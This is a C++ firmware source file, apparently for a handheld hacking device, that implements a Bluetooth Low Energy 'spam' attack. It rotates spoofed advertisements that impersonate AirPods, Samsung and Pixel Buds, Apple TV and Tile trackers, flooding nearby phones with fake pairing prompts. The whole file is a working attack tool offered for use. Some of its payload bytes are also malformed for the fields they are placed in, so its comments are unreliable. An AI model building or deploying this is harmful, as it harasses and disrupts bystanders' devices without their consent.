#include "hardware.h"
#include "ble_spam.h"

#ifdef ENABLE_BLE_SPAM
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>
#endif

bool bleSpamActive = false;
int bleCurrentProfile = 0;

// Apple Nearby Info format: type=0x07 (Nearby Info), len includes type byte
// Data: length, type, company_id(2), type+flags, action, instance_id
static const uint8_t appleAdvData_airpods[] = {0x07, 0xFF, 0x4C, 0x00, 0x07, 0x0A, 0x02, 0x00, 0x01};
static const uint8_t appleAdvData_airpods_max[] = {0x07, 0xFF, 0x4C, 0x00, 0x07, 0x0A, 0x0A, 0x00, 0x01};

// Samsung Galaxy Buds: manufacturer data
static const uint8_t samsungAdvData[] = {0x0A, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x03, 0x01};

// Google Pixel Buds: service data with UUID 0xAAFE (Eddystone-like)
// Flags + Complete List of 16-bit Service UUIDs
static const uint8_t pixelAdvData[] = {0x02, 0x01, 0x06, 0x03, 0x03, 0xAA, 0xFE};

// Apple TV setup code
static const uint8_t appleAdvData_appletv[] = {0x05, 0xFF, 0x4C, 0x00, 0x04, 0x0C};

// Tile
static const uint8_t tileAdvData[] = {0x02, 0x01, 0x06, 0x04, 0xFF, 0xFE, 0x00};

struct BLEAdvProfile {
  const char* name;
  const uint8_t* data;
  uint8_t len;
};

static const BLEAdvProfile profiles[] = {
  {"AirPods Pro",  appleAdvData_airpods,     sizeof(appleAdvData_airpods)},
  {"AirPods Max",  appleAdvData_airpods_max,  sizeof(appleAdvData_airpods_max)},
  {"Samsung Buds", samsungAdvData,           sizeof(samsungAdvData)},
  {"Pixel Buds",   pixelAdvData,             sizeof(pixelAdvData)},
  {"Apple TV",     appleAdvData_appletv,      sizeof(appleAdvData_appletv)},
  {"Tile",         tileAdvData,               sizeof(tileAdvData)},
};
static const int NUM_BLE_PROFILES = sizeof(profiles) / sizeof(profiles[0]);

#ifdef ENABLE_BLE_SPAM

static BLEServer *bleServer = nullptr;
static BLEAdvertising *bleAdvertising = nullptr;
static bool bleInitialized = false;
static unsigned long bleCycleInterval = 2000;

void initBLESpam() {
  bleSpamActive = false;
  bleCurrentProfile = 0;
  bleInitialized = false;
  bleServer = nullptr;
  bleAdvertising = nullptr;
}

void startBLESpam() {
  if (!bleInitialized) {
    BLEDevice::init("ReaperBLE");
    bleInitialized = true;
  }
  if (!bleServer) {
    bleServer = BLEDevice::createServer();
  }
  bleSpamActive = true;
}

void stopBLESpam() {
  if (bleAdvertising) {
    bleAdvertising->stop();
  }
  bleSpamActive = false;
}

void updateBLESpam() {
  static unsigned long lastBleCycle = 0;
  if (!bleSpamActive) return;
  if (millis() - lastBleCycle < bleCycleInterval) return;
  lastBleCycle = millis();

  if (!bleServer) return;

  // Stop previous advertisement
  if (bleAdvertising) {
    bleAdvertising->stop();
  }

  bleAdvertising = bleServer->getAdvertising();
  bleAdvertising->setMinInterval(0x20);
  bleAdvertising->setMaxInterval(0x20);

  const BLEAdvProfile &prof = profiles[bleCurrentProfile];
  BLEAdvertisementData advData;
  advData.setManufacturerData(std::string(reinterpret_cast<const char*>(prof.data), prof.len));
  bleAdvertising->setAdvertisementData(advData);
  bleAdvertising->start();

  bleCurrentProfile = (bleCurrentProfile + 1) % NUM_BLE_PROFILES;
}

#else

void initBLESpam() {}
void startBLESpam() {}
void stopBLESpam() {}
void updateBLESpam() {}

#endif